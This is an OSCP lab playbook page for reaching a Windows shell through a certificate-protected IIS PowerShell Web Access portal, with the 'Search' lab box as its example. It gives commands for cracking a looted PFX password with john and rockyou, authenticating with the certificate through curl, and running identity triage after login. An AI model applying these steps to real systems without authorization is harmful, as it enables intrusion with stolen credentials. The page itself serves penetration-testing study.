# AD - PowerShell Web Access

**Step 41A of 50 · AD**

*Use a certificate-authenticated IIS PowerShell Web Access portal when normal WinRM is not exposed or is not usable from Kali.*

## When to use this page

Open this stage when a web service exposes /staff, /pswa, or another PowerShell Web Access path; when IIS requests a client certificate; or when a recovered PFX certificate identifies a domain user.

## Confirm the client-certificate boundary

Save the response and inspect the redirect and authentication behavior:

~~~bash
curl -skI https://$Domain/staff | tee $BoxDir/loot/pswa-headers.txt
curl -si http://$BoxIP/certsrv | tee $BoxDir/loot/certsrv-headers.txt
~~~

If the PFX is password-protected, convert it for John and crack it offline:

~~~bash
pfx2john $BoxDir/loot/staff.pfx > $BoxDir/loot/staff.pfx.hash
john $BoxDir/loot/staff.pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt
john $BoxDir/loot/staff.pfx.hash --show
~~~

Inspect the certificate subject and issuer:

~~~bash
openssl pkcs12 -in $BoxDir/loot/staff.pfx -nokeys -clcerts \
  -passin pass:$PfxPass 2>/dev/null |
  openssl x509 -noout -subject -issuer
~~~

## Test the PFX against IIS

Use the hostname expected by IIS and explicitly select PKCS#12:

~~~bash
curl -skL https://$Domain/staff \
  --cert-type P12 \
  --cert $BoxDir/loot/staff.pfx:$PfxPass \
  -D $BoxDir/loot/pswa-redirects.txt \
  -o $BoxDir/loot/staff-logon.html
grep -E '^Location:|<title>' $BoxDir/loot/pswa-redirects.txt
~~~

Expected routing is /staff/ followed by a locale-specific logon.aspx page. Save cookies:

~~~bash
curl -skL https://$Domain/staff \
  --cert-type P12 \
  --cert $BoxDir/loot/staff.pfx:$PfxPass \
  -c $BoxDir/loot/cookies.txt \
  -b $BoxDir/loot/cookies.txt \
  -o $BoxDir/loot/staff-logon.html
grep -i 'form\|input\|action' $BoxDir/loot/staff-logon.html
~~~

## Complete the stateful PSWA login

The form normally includes:

- username and password fields
- target node and connection type
- WSMAN connection URI
- port 5985
- application WSMAN
- configuration Microsoft.PowerShell
- hidden ViewState and EventValidation values

Use a browser for the manual login:

~~~bash
firefox https://$Domain/staff &
~~~

Select computer-name, set the target node to the DC hostname or research, and use the recovered domain-user credential. Confirm an interactive PowerShell console, then run:

~~~powershell
whoami
hostname
whoami /groups
whoami /priv
~~~

## What did you get?

- [ ] PFX password cracks → **Inspect the certificate and go to the IIS client-certificate test**
- [ ] Curl reports PEM parsing → **Add --cert-type P12 and retry with the expected hostname**
- [ ] /staff redirects to logon.aspx → **Save cookies and complete the login in a browser**
- [ ] Login succeeds → **Run identity and group triage, then continue to [[AD - Group Triage]]**
- [ ] Login fails → **Refresh the ASP.NET form, preserve hidden fields/cookies, and verify the target node**

## Gotchas

> [!warning] PFX is not PEM
> Curl treats a PFX as PEM unless --cert-type P12 is supplied.

> [!warning] Hostname matters
> A certificate may work against the IP but the IIS binding may still require the domain or certificate hostname. Keep the domain in /etc/hosts and use it consistently.

> [!warning] PSWA is stateful
> ViewState, EventValidation, cookies, and the redirect chain are part of the login. A hand-built POST containing only visible fields is not a reliable replacement.

## Seen in

- [[OSCP/BOXES/WRITE UPS/AD/Search|Search]] — Sierra's PFX authenticated to IIS and opened Windows PowerShell Web Access

## Related stages

- [[AD - Service Scan]]
- [[AD - Web Enum]]
- [[AD - Credential Validation]]
- [[AD - WinRM Foothold]]
- [[AD - Group Triage]]
- [[AD - Clean Down]]

## Why this matters for OSCP

PowerShell Web Access is still a Windows shell path even when ordinary WinRM tooling is unavailable. Treat the certificate, web session, target node, and shell identity as separate evidence points.
